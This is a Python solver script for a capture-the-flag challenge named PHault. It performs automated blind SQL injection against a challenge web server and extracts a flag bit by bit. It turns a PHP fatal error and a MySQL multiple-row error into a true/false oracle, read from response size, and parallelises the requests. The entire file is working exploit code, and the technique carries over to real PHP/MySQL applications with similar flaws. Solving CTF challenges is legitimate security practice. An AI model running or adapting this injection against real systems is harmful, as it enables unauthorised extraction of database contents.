#!/usr/bin/env python3
"""Extract PHault's flag with the PHP fatal-error cardinality oracle."""

import argparse
import concurrent.futures
import threading
import urllib.parse
import urllib.request


DEFAULT_URL = "https://5d1816b4e8de0d6f.chal.ctf.ae/"
TRUE_SIZE = 4744
FALSE_SIZE = 4557
_counter = 0
_counter_lock = threading.Lock()


def response_size(url: str, condition: str) -> int:
    global _counter
    with _counter_lock:
        _counter += 1
        variable = f"@phault_{_counter}"

    # True: only id=1 is selected, SELECT ... INTO succeeds, and PHP fatals when
    # fetch_row() is called on boolean true. False: every user is selected and
    # MySQL errors because SELECT ... INTO receives multiple rows.
    payload = f"0 OR id=1 OR NOT({condition}) INTO {variable}"
    target = url + "?" + urllib.parse.urlencode({"id": payload})
    request = urllib.request.Request(target, headers={"User-Agent": "phault-solver/1"})
    with urllib.request.urlopen(request, timeout=30) as response:
        return len(response.read())


def oracle(url: str, condition: str) -> bool:
    for _ in range(3):
        size = response_size(url, condition)
        if size == TRUE_SIZE:
            return True
        if size == FALSE_SIZE:
            return False
    raise RuntimeError(f"unexpected response size {size} for {condition!r}")


def find_length(url: str) -> int:
    expression = "LENGTH((SELECT flag FROM flag LIMIT 1))"
    low, high = 0, 128
    while low < high:
        middle = (low + high) // 2
        if oracle(url, f"{expression}>{middle}"):
            low = middle + 1
        else:
            high = middle
    return low


def extract_bit(url: str, position: int, bit: int) -> tuple[int, int, bool]:
    character = f"ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1),{position},1))"
    return position, bit, oracle(url, f"({character}&{bit})!=0")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("url", nargs="?", default=DEFAULT_URL)
    parser.add_argument("--workers", type=int, default=16)
    args = parser.parse_args()

    url = args.url.rstrip("/") + "/"
    length = find_length(url)
    print(f"[+] flag length: {length}", flush=True)

    values = [0] * length
    jobs = [(position, bit) for position in range(1, length + 1)
            for bit in (1, 2, 4, 8, 16, 32, 64)]
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = [pool.submit(extract_bit, url, position, bit)
                   for position, bit in jobs]
        for future in concurrent.futures.as_completed(futures):
            position, bit, enabled = future.result()
            if enabled:
                values[position - 1] |= bit

    flag = "".join(map(chr, values))
    print(f"[+] flag: {flag}")


if __name__ == "__main__":
    main()
